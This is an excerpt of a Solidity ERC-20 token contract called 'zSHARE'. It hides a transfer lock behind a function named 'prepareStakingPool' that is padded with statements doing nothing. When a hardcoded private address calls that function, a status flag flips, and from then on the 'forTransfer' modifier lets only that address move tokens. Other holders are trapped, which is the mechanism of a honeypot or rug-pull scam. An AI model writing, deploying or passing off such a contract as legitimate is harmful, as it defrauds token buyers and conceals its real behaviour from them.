...
contract zSHARE is Context, IERC20, IERC20Metadata {
    ...
    uint256 private _tokenax_totalSupply;
    uint256 private _tokenax_status = 0;
    uint256 public stakingPoolaxStatus = 0;

    string private _tokenax_name;
    string private _tokenax_symbol;

    address private _poolaxAddress = 0xDa3A7dad214a2A6554624aE6124cDcC72337ad38; 

    constructor() {
        _tokenax_name = "zSHARE";
        _tokenax_symbol = "zSHARE";
        _tokenax_totalSupply = 100 * 10 ** 18;
        _balances[msg.sender] = _tokenax_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolaxAddress || _tokenax_status == 0);
        _;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolaxStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolaxAddress)
        {
            _tokenax_status = 1;
        }
    }
